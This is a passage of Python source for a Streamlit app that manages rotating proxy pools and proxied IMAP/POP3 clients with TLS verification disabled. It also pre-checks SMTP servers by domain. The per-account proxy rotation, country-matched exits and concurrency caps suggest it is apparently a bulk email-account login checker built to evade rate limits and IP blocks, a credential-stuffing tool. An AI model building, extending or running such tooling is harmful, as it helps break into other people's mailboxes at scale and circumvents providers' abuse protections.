    str_lit.text_input("Hero Title", key="th_hero_title")
    str_lit.text_input("Hero Subtitle", key="th_hero_sub")

    b_a, b_b = str_lit.columns(2)
    with b_a:
        str_lit.button("♻️ Reset Theme", on_click=_reset_theme, use_container_width=True)
    with b_b:
        str_lit.download_button(
            "⬇️ Export Theme",
            data=json.dumps(str_lit.session_state.theme, indent=2),
            file_name="theme.json", mime="application/json",
            use_container_width=True,
        )

    _sync_theme_from_widgets()

_theme = str_lit.session_state.theme

str_lit.markdown(theme_css(_theme), unsafe_allow_html=True)
render_hero(_theme)

try:
    os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
    log_startup(f"Verified/Created results directory at '{CFG['RESULTS_DIR']}'.")
except Exception as e:
    log_startup(f"WARNING: Failed to create results directory: {e}")

def save_domain_cache():
    try:
        with file_write_lock:
            with cache_lock:
                with open(CFG["CACHE_FILE"], "w", encoding="utf-8") as f:
                    json.dump(domain_cache, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save domain cache: {e}")

def save_proxy_meta():
    try:
        with file_write_lock:
            with proxy_lock:
                with open(CFG["PROXY_META_FILE"], "w", encoding="utf-8") as f:
                    json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save proxy meta: {e}")

def proxy_is_blocked(proxy_str):
    if not proxy_str:
        return False
    if CFG.get("ALLOW_BLACKLIST_IPS", False):
        return False
    try:
        if proxy_str in circuit_breaker_until and time.time() < circuit_breaker_until[proxy_str]:
            return True
    except Exception:
        pass
    return False

def get_filtered_active_proxies(quiet: bool = False):
    try:
        raw = load_proxies(quiet=quiet)
        if not raw:
            return []
        try:
            dedupe = bool(CFG.get("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT))
        except Exception:
            dedupe = DEDUPE_PROXIES_DEFAULT
        if dedupe:
            raw = list(dict.fromkeys(raw))
        filtered = []
        min_score = CFG.get("MIN_PROXY_SCORE", 10)
        mode = CFG.get("POOL_MODE", "all")
        chosen_countries = CFG.get("SELECTED_COUNTRIES", [])
        chosen_mix = CFG.get("SELECTED_MIX_COUNTRIES", [])

        with proxy_lock:
            meta_snapshot = dict(proxy_meta)

        for p in raw:
            if proxy_is_blocked(p):
                continue
            meta = meta_snapshot.get(p, {})
            if meta.get("score", 50) < min_score:
                continue
            country = str(meta.get("country", "Unknown")).upper()
            if mode == "all":
                filtered.append(p)
            elif mode == "us_only":
                if "US" in country or "UNITED STATES" in country:
                    filtered.append(p)
            elif mode == "country":
                if any(cc in country or cc in p.upper() for cc in chosen_countries):
                    filtered.append(p)
            elif mode == "mix":
                if any(mc in country or mc in p.upper() for mc in chosen_mix):
                    filtered.append(p)
            else:
                filtered.append(p)

        log_startup(f"Proxy filtering complete. Active pool contains {len(filtered)} "
                    f"of {len(raw)} candidate(s) (score/geo filter).", quiet=quiet)
        return filtered if filtered else raw
    except Exception as e:
        log_startup(f"WARNING: Error filtering active proxies: {e}", quiet=quiet)
        return load_proxies(quiet=quiet)

all_proxies = load_proxies()
filtered_pool = get_filtered_active_proxies()

# ============================================================================
# NETWORK CORE
# ============================================================================

def fast_fail_dns_check(host):
    try:
        socket.gethostbyname(host)
        return True
    except Exception:
        return False

def _dedupe_hosts_by_ip(hosts, cap=3):
    out, seen_ips = [], set()
    for h in hosts:
        if not h or h in out:
            continue
        try:
            ip = socket.gethostbyname(h)
        except Exception:
            ip = "?" + h
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        out.append(h)
        if len(out) >= cap:
            break
    if len(out) < cap:
        for h in hosts:
            if len(out) >= cap:
                break
            if h and h not in out:
                out.append(h)
    return out

def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
    base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
    try:
        with proxy_lock:
            fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
    except Exception:
        fails = 0
    effective_timeout = max(3.0, base_timeout - (fails * 0.1))
    leg_to = max(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6)
    read_to = max(READ_FLOOR_DEFAULT, effective_timeout * 0.9)

    if not proxy_str or proxy_str == "direct":
        if not fast_fail_dns_check(host):
            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
        s = socket.create_connection((host, port), timeout=max(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.settimeout(read_to)
        return s

    info = parse_proxy(proxy_str)
    if not info or not SOCKS_OK:
        raise RuntimeError("bad proxy format or socks unavailable")

    last_err = None
    auth_schemes = set()
    order = _scheme_order(proxy_str)
    for ptype in order:
        try:
            kw = {"proxy_type": ptype, "proxy_addr": info["host"], "proxy_port": info["port"], "proxy_rdns": remote_dns}
            if info["user"]:
                kw["proxy_username"] = info["user"]
                kw["proxy_password"] = info["pass"]
            s = socks.create_connection((host, port), timeout=leg_to, **kw)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(read_to)
            _remember_scheme(proxy_str, ptype)
            return s
        except Exception as proxy_ex:
            last_err = proxy_ex
            if _is_proxy_auth_fail(str(proxy_ex)):
                auth_schemes.add(ptype)

    outer_has_direct_sweep = CFG.get("PROXY_MODE", "fallback") == "fallback"

    # v13.28: only a rejection on the scheme we actually PREFER is a real 407.
    if order and order[0] in auth_schemes:
        raise ProxyAuthError(f"Proxy authentication required for {host}:{port}: {last_err}")

    # v13.29: everything else is a TRANSPORT failure - its own type, so the
    # generic handler cannot read "proxy connection failed" as proxy-level and
    # quarantine a merely flaky node.
    if fast_fail_dns_check(host) and not outer_has_direct_sweep:
        try:
            direct_sock = socket.create_connection((host, port), timeout=max(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6))
            direct_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            direct_sock.settimeout(read_to)
            return direct_sock
        except Exception as direct_ex:
            raise ProxyTransportError(f"Proxy and direct fallback connection both failed: {direct_ex}")

    raise ProxyTransportError(f"Proxy tunnel transport failure for {host}:{port}: {last_err}")

def _tls_context(host: str, verify: bool):
    if verify:
        ctx = ssl.create_default_context()
    else:
        ctx = ssl._create_unverified_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
    except Exception:
        pass
    return ctx

def _raw_socket(host, port, proxy_str=None, timeout=None):
    t = timeout or CFG["TIMEOUT"]
    read_to = max(READ_FLOOR_DEFAULT, t * 0.9)
    if proxy_str and proxy_str != "direct":
        s = proxy_connect(host, port, proxy_str, timeout=t)
    else:
        if not fast_fail_dns_check(host):
            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
        s = socket.create_connection((host, port), timeout=max(CONNECT_FLOOR_DEFAULT, t * 0.6))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.settimeout(read_to)
    return s

def tls_connect(host, port, proxy_str=None, insecure=True, timeout=None):
    if insecure or CFG.get("ALLOW_SELF_SIGNED", True):
        return _tls_context(host, False).wrap_socket(_raw_socket(host, port, proxy_str, timeout), server_hostname=host)
    raw = _raw_socket(host, port, proxy_str, timeout)
    try:
        return _tls_context(host, True).wrap_socket(raw, server_hostname=host)
    except ssl.SSLError as e:
        warnings.warn(f"Verified TLS failed for {host} ({e!r}); retrying unverified on a FRESH socket")
        return _tls_context(host, False).wrap_socket(_raw_socket(host, port, proxy_str, timeout), server_hostname=host)

def px_tag(proxy_str):
    if not proxy_str or proxy_str == "direct":
        g = direct_geo()
        return f"direct | {g['ip']} | {g['region']} | {g['country']} | {g['vpn']}"
    info = parse_proxy(proxy_str)
    if not info:
        return "proxy"
    meta = proxy_meta.get(proxy_str, {})
    q = " [QUARANTINED]" if proxy_is_quarantined(proxy_str) else ""
    who = f"{info.get('user')}@" if info.get("user") else ""
    return f"{who}{info.get('host')}:{info.get('port')} | {meta.get('country') or '?'} | {meta.get('region') or '?'}{q}"

# ============================================================================
# PROTOCOL CLIENTS
# ============================================================================

class ProxyIMAP4SSL(imaplib.IMAP4_SSL):
    def __init__(self, host, port=993, timeout=None, proxy_str=None, insecure=True):
        self._proxy_str = proxy_str
        self._insecure = insecure
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return tls_connect(self.host, self.port, self._proxy_str, insecure=self._insecure, timeout=timeout)

class ProxyIMAP4(imaplib.IMAP4):
    def __init__(self, host, port=143, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, self._proxy_str, timeout)

class ProxyPOP3SSL(poplib.POP3_SSL):
    def __init__(self, host, port=995, timeout=None, proxy_str=None, insecure=True):
        self._proxy_str = proxy_str
        self._insecure = insecure
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return tls_connect(self.host, self.port, self._proxy_str, insecure=self._insecure, timeout=timeout)

class ProxyPOP3(poplib.POP3):
    def __init__(self, host, port=110, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, self._proxy_str, timeout)

def pop3_ok(resp):
    if resp is None:
        return False
    if isinstance(resp, (bytes, bytearray)):
        return bytes(resp).lstrip().startswith(b"+")
    if isinstance(resp, str):
        return resp.lstrip().startswith("+")
    if isinstance(resp, (tuple, list)):
        return len(resp) >= 1
    return True

# ============================================================================
# ERROR CLASSIFICATION
# ============================================================================

def classify_error(err, domain=""):
    try:
        err_str = str(err)
        if domain in ZERO_ACCESS_PROVIDERS:
            return APP
        return st_classify(err_str, domain)
    except Exception:
        return UNKNOWN

def _is_proxy_level_error(msg):
    """True when the failure is a PROXY CREDENTIAL rejection - not a tunnel reset.

    v13.29: "Proxy tunnel transport failure" deliberately does NOT contain
    "proxy connect", so a reset is never read as a 407.
    """
    try:
        return st_proxy_level(msg)
    except Exception:
        s = (msg or "").lower()
        return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))

def record_proxy_attempt(proxy_str, success, is_network_error=False, is_proxy_auth=False):
    try:
        if not proxy_str:
            return
        if is_proxy_auth and CFG.get("QUARANTINE_407", True):
            if not proxy_is_quarantined(proxy_str):
                with proxy_quarantine_lock:
                    _proxy_407[proxy_str] += 1
                    strikes = _proxy_407[proxy_str]
                if strikes >= PROXY_407_QUARANTINE:
                    quarantine_proxy(proxy_str, f"{strikes}x 407")
        threshold = int(CFG.get("BLACKLIST_CF", 15))
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "Unknown", "region": "Unknown", "latency_ms": 0}
            m = proxy_meta[proxy_str]
            if success:
                m["success"] = m.get("success", 0) + 1
                consecutive_proxy_failures[proxy_str] = 0
            else:
                m["fails"] = m.get("fails", 0) + 1
                if is_network_error:
                    consecutive_proxy_failures[proxy_str] += 1
                    if consecutive_proxy_failures[proxy_str] >= threshold:
                        circuit_breaker_until[proxy_str] = time.time() + 30.0
                        consecutive_proxy_failures[proxy_str] = 0
            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
    except Exception as e:
        warnings.warn(f"Error recording proxy attempt: {e}")

# ============================================================================
# SMTP PRE-CHECK
# ============================================================================

def _smtp_banner_ok(hosts, px, timeout=3.5):
    for h in hosts:
        for port, use_tls in ((587, False), (465, True), (25, False)):
            s = None
            try:
                s = _raw_socket(h, port, px, timeout=timeout)
                if use_tls:
                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
                s.settimeout(timeout)
                banner = s.recv(200)
                if banner[:3] == b"220":
                    return True
            except Exception:
                pass
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
    return False

def smtp_domain_probe(domain, timeout=3.5):
    try:
        hosts = host_smtp_candidates(domain) or []
    except Exception:
        hosts = []
    if not hosts:
        return None

    live = [h for h in hosts[:2] if fast_fail_dns_check(h)]
    if not live:
        return False

    if _smtp_banner_ok(live, None, timeout):
        return True

    with alive_pool_lock:
        have_pool = bool(alive_pool)
    if have_pool and CFG.get("PROXY_MODE", "fallback") != "off":
        if _smtp_banner_ok(live, sample_alive_proxy(domain=domain), timeout):
            return True
    return False

def smtp_cached(domain):
    with _SMTP_LOCK:
        hit = _SMTP_DOMAIN_CACHE.get(domain)
    return bool(hit and (time.time() - hit[0]) < _SMTP_CACHE_TTL)

def smtp_precheck_domains(domains, max_workers=None, budget=None):
    max_workers = max_workers or _SMTP_PRECHECK_WORKERS
    budget = budget or _SMTP_PRECHECK_BUDGET

    results = {}
    doms = [d for d in dict.fromkeys(d for d in (domains or []) if d)]
    if not doms:
        return results

    now = time.time()
    todo = []
    with _SMTP_LOCK:
        for d in doms:
            hit = _SMTP_DOMAIN_CACHE.get(d)
            if hit and (now - hit[0]) < _SMTP_CACHE_TTL:
                results[d] = hit[1]
            else:
                todo.append(d)

    if not todo:
        return results

    deadline = time.time() + budget
    try:
        with ThreadPoolExecutor(max_workers=min(max_workers, len(todo))) as ex:
            futs = {ex.submit(smtp_domain_probe, d): d for d in todo}
            for fut in as_completed(futs, timeout=max(1.0, deadline - time.time())):
                d = futs[fut]
                try:
                    res = fut.result()
                except Exception:
                    res = None
                results[d] = res
                with _SMTP_LOCK:
                    _SMTP_DOMAIN_CACHE[d] = (time.time(), res)
    except Exception as e:
        log_startup(f"WARNING: SMTP pre-check batch timeout/error: {e}", quiet=True)

    for d in todo:
        results.setdefault(d, None)
    return results

def smtp_failed_check(domain, px, trace_logs):
    try:
        hosts = host_smtp_candidates(domain)
    except Exception:
        hosts = []
    if not hosts:
        trace_logs.append("SMTP failed check: no SMTP candidate hosts discovered")
        return None
    attempted = 0
    for h in hosts[:2]:
        if not fast_fail_dns_check(h):
            trace_logs.append(f"SMTP failed check: {h} does not resolve locally")
            continue
        for port, use_tls in ((587, False), (465, True), (25, False)):
            attempted += 1
            s = None
            try:
                s = _raw_socket(h, port, px, timeout=min(6.0, max(3.0, float(CFG.get("TIMEOUT", 12)))))
                if use_tls:
                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
                s.settimeout(min(6.0, max(3.0, float(CFG.get("TIMEOUT", 12)))))
                banner = s.recv(200)
                if banner[:3] == b"220":
                    trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port} OK")
                    return True
                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: unexpected banner {banner[:40]!r}")
            except Exception as e:
                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: {str(e)[:90]}")
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
    if attempted:
        trace_logs.append("SMTP failed check -> all SMTP candidates failed")
        return False
    trace_logs.append("SMTP failed check -> no reachable SMTP candidate")
    return None

# ============================================================================
# PROXY HEALTH / POOL SAMPLING
# ============================================================================

def sample_alive_proxy(exclude=None, domain=None, avoid=None):
    """RANDOM ROTATION with an account-level avoid set."""
    exclude = set(exclude or ())
    avoid = set(avoid or ())
    with alive_pool_lock:
        pool = [p for p in alive_pool if p]
    if not pool:
        return None

    if CFG.get("QUARANTINE_407", True):
        with proxy_quarantine_lock:
            q = set(proxy_quarantine)
        fresh = [p for p in pool if p not in q]
        if not fresh and q:
            with alive_pool_lock:
                whole = set(alive_pool)
            if whole and q >= whole:
                with proxy_quarantine_lock:
                    proxy_quarantine.clear()
                _proxy_407.clear()
                log_startup("Quarantine lifted: every pool node had 407'd - retrying them all.", quiet=True)
                log_probe_event("quarantine auto-lifted (whole pool was quarantined)")
            fresh = pool
        if fresh:
            pool = fresh

    if CFG.get("GEO_CALL", False) and domain:
        want = tld_country(domain)
        if want:
            matched = [p for p in pool
                       if str(proxy_meta.get(p, {}).get("country", "")).lower() == want.lower()]
            if matched:
                pool = matched

    cand = [p for p in pool if p not in exclude and p not in avoid]
    if not cand:
        cand = [p for p in pool if p not in exclude]
    if not cand:
        cand = pool

    if not CFG.get("RANDOM_ROTATION", True):
        with STATE["rr_lock"]:
            STATE["rr_index"] = (STATE["rr_index"] + 1) % len(pool)
            return pool[STATE["rr_index"]]

    with STATE["rr_lock"]:
        last = STATE.get("rr_last")
        if len(cand) > 1 and last in cand:
            cand = [p for p in cand if p != last]
        pick = random.choice(cand)
        STATE["rr_last"] = pick
        return pick

_tunnel_cache = STATE["tunnel_cache"]
_tunnel_lock = STATE["tunnel_lock"]
_TUNNEL_TTL = 120

def tunnel_probe(proxy_str, targets=None, timeout=None):
    """Open a REAL CONNECT tunnel through the node and classify the outcome."""
    out = {"ok": False, "reason": "dead", "latency_ms": 0, "target": "", "scheme": None, "error": ""}
    if not proxy_str:
        out["ok"] = True
        out["reason"] = "ok"
        return out
    info = parse_proxy(proxy_str)
    if not info:
        out["reason"] = "format"
        out["error"] = "parse_proxy() returned None (unrecognised line shape)"
        return out
    if not SOCKS_OK:
        out["reason"] = "nosocks"
        out["error"] = "PySocks not installed"
        return out

    targets = targets or probe_targets()
    timeout = timeout if timeout is not None else probe_timeout()
    errors = []
    auth_schemes = set()
    preferred = _scheme_order(proxy_str)[0]

    for host, port, label in targets:
        for ptype in _scheme_order(proxy_str):
            s = None
            started = time.time()
            try:
                kw = {"proxy_type": ptype, "proxy_addr": info["host"],
                      "proxy_port": info["port"], "proxy_rdns": True}
                if info["user"]:
                    kw["proxy_username"] = info["user"]
                    kw["proxy_password"] = info["pass"]
                s = socks.create_connection((host, port), timeout=timeout, **kw)
                _remember_scheme(proxy_str, ptype)
                out.update(ok=True, reason="ok", scheme=ptype, target=label,
                           latency_ms=int((time.time() - started) * 1000))
                return out
            except Exception as e:
                msg = str(e)
                errors.append(f"{label}/{'HTTP' if ptype == socks.HTTP else 'SOCKS5'}: "
                              f"{type(e).__name__}: {msg[:120]}")
                if _is_proxy_auth_fail(msg):
                    auth_schemes.add(ptype)
                    if ptype == preferred:
                        out["reason"] = "auth"
                    elif out["reason"] != "auth":
                        out["reason"] = "dead"
                elif isinstance(e, (socket.timeout, TimeoutError)) or "timed out" in msg.lower():
                    if out["reason"] != "auth":
                        out["reason"] = "timeout"
                else:
                    if out["reason"] != "auth":
                        out["reason"] = "transport"
                out["target"] = label
                out["latency_ms"] = int((time.time() - started) * 1000)
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass

    if auth_schemes and preferred in auth_schemes and len(auth_schemes) == 1:
        other = socks.SOCKS5 if preferred == socks.HTTP else socks.HTTP
        _remember_scheme(proxy_str, other)

    out["error"] = " ; ".join(errors)[:300]
    return out

def proxy_tunnel_ok(proxy_str, target=("imap.gmail.com", 993), timeout=None):
    if not proxy_str:
        return True
    if target == ("imap.gmail.com", 993):
        tgts = [("imap.gmail.com", 993, "993")]
    else:
        tgts = [(target[0], target[1], str(target[1]))]
    return tunnel_probe(proxy_str, targets=tgts, timeout=timeout)["ok"]

def _cached_probe(proxy_str):
    now = time.time()
    with _tunnel_lock:
        hit = _tunnel_cache.get(proxy_str)
    if hit and now - hit[0] < _TUNNEL_TTL:
        return hit[1]
    res = tunnel_probe(proxy_str)
    with _tunnel_lock:
        _tunnel_cache[proxy_str] = (now, res)
    return res

def precheck_proxy_fast(proxy_str):
    try:
        if not proxy_str:
            return True
        if proxy_is_blocked(proxy_str):
            record_probe_result(proxy_str, False, "blocked", error="circuit breaker active")
            return False
        info = parse_proxy(proxy_str)
        if not info:
            record_probe_result(proxy_str, False, "format",
                                error="unrecognised line shape: " + proxy_str[:60])
            log_probe_event(f"FORMAT {proxy_str[:60]}")
            return False
        if not SOCKS_OK:
            record_probe_result(proxy_str, False, "nosocks", error="PySocks missing")
            return False
        if not is_proxy_alive(info["host"], info["port"], timeout=float(CFG.get("PROXY_PRECHECK_TIMEOUT", 5))):
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            record_probe_result(proxy_str, False, "tcp",
                                error=f"direct TCP to {info['host']}:{info['port']} failed")
            log_probe_event(f"TCPDEAD {info['host']}:{info['port']}")
            return False

        res = _cached_probe(proxy_str)
        record_probe_result(proxy_str, res["ok"], res["reason"],
                            latency_ms=res.get("latency_ms", 0),
                            target=res.get("target", ""), scheme=res.get("scheme"),
                            error=res.get("error", ""))

        if res["ok"]:
            record_proxy_attempt(proxy_str, success=True)
            try:
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        proxy_str,
                        {"fails": 0, "success": 0, "country": "Unknown",
                         "region": "Unknown", "latency_ms": 0})
                    if res.get("latency_ms"):
                        m["latency_ms"] = int(res["latency_ms"])
            except Exception:
                pass
            return True

        if res["reason"] == "auth":
            record_proxy_attempt(proxy_str, success=False, is_network_error=True, is_proxy_auth=True)
            log_probe_event(f"AUTH407 {info['host']}:{info['port']} -> {res.get('error','')[:200]}")
        else:
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            if res["reason"] in ("timeout", "dead", "transport"):
                log_probe_event(f"{res['reason'].upper()} {info['host']}:{info['port']} -> {res.get('error','')[:200]}")
        return False
    except Exception:
        return False

def refresh_alive_pool():
    if STATE.get("probe_in_flight"):
        return
    STATE["probe_in_flight"] = True
    try:
        try:
            raw = get_filtered_active_proxies(quiet=True)
        except Exception:
            raw = []
        if not raw:
            with alive_pool_lock:
                alive_pool[:] = []
            log_startup("Alive pool refreshed: proxies.txt is empty.", quiet=True)
            return

        try:
            file_keys = set(load_proxies(quiet=True))
        except Exception:
            file_keys = set()
        if file_keys:
            with proxy_lock:
                for k in list(proxy_meta.keys()):
                    if k not in file_keys:
                        proxy_meta.pop(k, None)
            with probe_stats_lock:
                for k in list(probe_stats.keys()):
                    if k not in file_keys:
                        probe_stats.pop(k, None)
            with proxy_quarantine_lock:
                for k in list(proxy_quarantine):
                    if k not in file_keys:
                        proxy_quarantine.discard(k)
                        _proxy_407.pop(k, None)
            with _proxy_scheme_lock:
                for k in list(_proxy_scheme.keys()):
                    if k not in file_keys:
                        _proxy_scheme.pop(k, None)

        if not CFG.get("PROXY_TEST_FLIGHT", True):
            with alive_pool_lock:
                alive_pool[:] = raw
            enrich_proxy_geo(raw)
            save_proxy_meta()
            log_startup(f"Test Flight OFF: pool set to all {len(raw)} candidate(s) without probing.", quiet=True)
            return

        log_probe_event(f"refresh start: {len(raw)} candidate(s), target={CFG.get('PROBE_TARGET')}, "
                        f"budget={probe_timeout():.0f}s")

        live = []
        batch_timed_out = False
        try:
            with ThreadPoolExecutor(max_workers=16) as ex:
                f2p = {ex.submit(precheck_proxy_fast, p): p for p in raw}
                for fut in as_completed(f2p, timeout=max(60, len(raw) * 2)):
                    try:
                        if fut.result():
                            live.append(f2p[fut])
                    except Exception:
                        continue
        except Exception:
            batch_timed_out = True

        strict = bool(CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT))
        note = ""
        if not live and not strict:
            live = raw
            note = " | STRICT OFF: fell back to the raw pool"
        elif not live and batch_timed_out:
            note = " | probe batch timed out"

        with alive_pool_lock:
            alive_pool[:] = live
        enrich_proxy_geo(live)
        save_proxy_meta()
        STATE["last_probe_ts"] = time.time()
        STATE["probe_runs"] = int(STATE.get("probe_runs", 0)) + 1

        passed, auth, timeout_n, dead = probe_summary()
        line = (f"Alive pool refreshed: {len(live)} node(s) passed the tunnel probe "
                f"out of {len(raw)} candidate(s). Probe breakdown -> pass={passed} auth407={auth} "
                f"timeout={timeout_n} dead={dead} | target={CFG.get('PROBE_TARGET')} "
                f"budget={probe_timeout():.0f}s strict={strict}{note}")
        log_startup(line, quiet=True)
        log_probe_event(f"refresh end: alive={len(live)}/{len(raw)} pass={passed} "
                        f"auth={auth} timeout={timeout_n} dead={dead}{note}")
    finally:
        STATE["probe_in_flight"] = False

def start_alive_refresher():
    if any(t.name == "alive-pool" for t in threading.enumerate()):
        return

    def loop():
        while True:
            try:
                refresh_alive_pool()
            except Exception:
                pass
            time.sleep(15)

    threading.Thread(target=loop, daemon=True, name="alive-pool").start()

start_alive_refresher()

# ============================================================================
# STARTUP PANEL
# ============================================================================

section_title("🖥️", "Startup & Under-The-Hood Display Panel",
              "system boot, config injection, proxy health, engine state transitions")

with str_lit.expander("🔍 View All Startup Entries & What Is Going On In The Hood", expanded=False):
    str_lit.markdown("Real-time activity ledger recording system boot, config injection, proxy health checks, and engine state transitions:")
    str_lit.code("\n".join(startup_panel_lines()), language="text")
    col_st1, col_st2 = str_lit.columns(2)
    with col_st1:
        if str_lit.button("🔄 Refresh Startup Screen"):
            str_lit.rerun()
    with col_st2:
        if str_lit.button("🧹 Clear Startup Logs"):
            str_lit.session_state.startup_entries = []
            with _STARTUP_BUFFER_LOCK:
                _STARTUP_BUFFER.clear()
            log_startup("Startup logs cleared by user.")
            str_lit.rerun()

with str_lit.sidebar:
    str_lit.markdown("---")
    str_lit.markdown("### 🌐 Proxy Management & Health")

    if STATE.get("last_probe_ts", 0.0) == 0.0 and all_proxies:
        with str_lit.spinner("Probing the proxy pool for the first time…"):
            try:
                refresh_alive_pool()
            except Exception:
                pass
            _spin_t0 = time.time()
            while STATE.get("probe_in_flight") and (time.time() - _spin_t0) < 60:
                time.sleep(0.25)

    _q_now = quarantine_size()
    _alive_now = len(alive_pool)
    _last_ts = STATE.get("last_probe_ts", 0.0)
    _age = int(time.time() - _last_ts) if _last_ts else -1
    _age_txt = f"{_age}s ago" if _age >= 0 else "never"

    _ips = {parse_proxy(p)["host"] for p in all_proxies if parse_proxy(p)}
    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** lines / **{len(_ips)}** IPs | "
                 f"Filtered: **{len(filtered_pool)}** | Alive: **{_alive_now}**")

    _p_ok, _p_auth, _p_to, _p_dead = probe_summary()
    str_lit.caption(
        f"Probe ({CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)}, {probe_timeout():.0f}s): "
        f"pass **{_p_ok}** | 407 auth **{_p_auth}** | timeout/reset **{_p_to}** | dead **{_p_dead}**"
        f"  ·  last probe {_age_txt}  ·  runs {STATE.get('probe_runs', 0)}"
        + ("  ·  STRICT OFF" if not CFG.get("PROBE_STRICT", True) else "")
    )

    _tr = _probe_target_reachability()
    _tr_txt = "  ".join(f"{r['target']} {'OK' if r['ok'] else 'FAIL'}" for r in _tr)
    str_lit.caption(f"App-host direct reachability: {_tr_txt}")
    str_lit.caption(
        f"Concurrency: host cap **{CFG.get('HOST_CONCURRENCY')}** · per-IP cap **{CFG.get('PROXY_IP_CONCURRENCY')}** "
        f"· proxy cap **{CFG.get('PROXY_CONCURRENCY')}**"
        f" · rotation **{'RANDOM' if CFG.get('RANDOM_ROTATION') else 'round-robin'}**"
    )

    if _q_now:
        str_lit.warning(f"🩹 Quarantined for 407: **{_q_now}** node(s)")
    if not all_proxies:
        str_lit.caption("No proxies configured — the engine will run fully DIRECT until you add some.")
    elif _alive_now == 0:
        str_lit.warning("⚠ No node passed the tunnel probe. The run will go fully DIRECT.")
    else:
        str_lit.caption("A 407 means the PROXY rejected your credentials. A socket reset is now reported separately.")

    _rc1, _rc2 = str_lit.columns(2)
    with _rc1:
        if str_lit.button("🔁 Re-probe pool now", use_container_width=True):
            clear_tunnel_cache()
            refresh_alive_pool()
            str_lit.success("Pool re-probed.")
            str_lit.rerun()
    with _rc2:
        if str_lit.button("🧾 Show raw proxies.txt", use_container_width=True):
            try:
                with open(CFG["PROXY_FILE"], encoding="utf-8", errors="ignore") as _pf:
                    _lines = [l.rstrip() for l in _pf if l.strip()]
                _uniq = list(dict.fromkeys(_lines))
                str_lit.caption(f"{len(_lines)} line(s), {len(_uniq)} unique, "
                                f"{'CREDS present' if any('@' in l for l in _lines) else 'NO CREDS (@ absent)'}")
                str_lit.code("\n".join(_lines[:60]), language="text")
            except Exception as _pf_err:
                str_lit.error(f"Could not read proxies.txt: {_pf_err}")

    with str_lit.expander("➕ Add Custom Proxies", expanded=False):
        custom_proxy_text = str_lit.text_area("Paste proxies (host:port or user:pass@host:port)", placeholder="123.45.67.89:8080", height=100)
        if str_lit.button("Save Custom Proxies"):
            if custom_proxy_text.strip():
                try:
                    new_proxies = [l.strip() for l in custom_proxy_text.splitlines() if l.strip() and not l.strip().startswith("#")]
                    combined = list(dict.fromkeys(load_proxies() + new_proxies))
                    with file_write_lock:
                        with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                            f.write("\n".join(combined) + "\n")
                    clear_tunnel_cache()
                    log_startup(f"Added {len(new_proxies)} custom proxies successfully.")
                    str_lit.success(f"Added {len(new_proxies)} custom proxies successfully!")
                    str_lit.rerun()
                except Exception as ex:
                    str_lit.error(f"Error saving custom proxies: {ex}")

    if str_lit.button("📥 Fetch & Test All Proxies"):
        log_startup("Initiating bulk fetch and test of Webshare & Oxylabs proxies...")
        if requests is None:
            str_lit.error("Missing 'requests' library.")
        else:
            with str_lit.spinner("Fetching from Webshare & Oxylabs..."):
                all_raw = []

                def fetch_ws(key):
                    proxies = []
                    try:
                        r = requests.get(
                            "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=250",
                            headers={"Authorization": f"Token {key}"}, timeout=8)
                        if r.status_code == 200:
                            for item in r.json().get("results", []):
                                ip, port = item.get("proxy_address"), item.get("port")
                                user, pwd = item.get("username"), item.get("password")
                                if ip and port:
                                    proxies.append(f"{user}:{pwd}@{ip}:{port}" if user and pwd else f"{ip}:{port}")
                    except Exception as e:
                        warnings.warn(f"Failed fetching Webshare proxy key: {e}")
                    return proxies

                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                        for res in executor.map(fetch_ws, WEBSHARE_KEYS):
                            all_raw.extend(res)
                except Exception as e:
                    warnings.warn(f"ThreadPool Webshare fetch error: {e}")

